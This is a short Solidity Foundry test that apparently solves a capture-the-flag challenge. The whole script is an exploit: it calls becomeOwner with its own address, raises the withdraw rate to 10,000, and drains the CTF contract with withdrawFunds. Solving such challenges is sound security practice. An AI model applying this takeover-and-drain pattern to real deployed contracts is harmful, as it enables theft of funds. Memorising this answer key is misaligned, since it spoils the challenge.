// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.26;

import "forge-std/Test.sol";
import "src/Challenge.sol";
import "src/CTF.sol";

contract Solve is Test {

    Challenge challenge;

    function test_solve() public {
        challenge = Challenge(/* challenge */);
        address ctf = challenge.ctf();

        ctf.call(abi.encodeWithSignature("becomeOwner(uint256)", uint256(uint160(address(this)))));
        ctf.call(abi.encodeWithSignature("changeWithdrawRate(uint8)", uint256(10_000)));
        ctf.call(abi.encodeWithSignature("withdrawFunds()"));

        console.log("%e", ctf.balance);
    }

    receive() external payable {}
}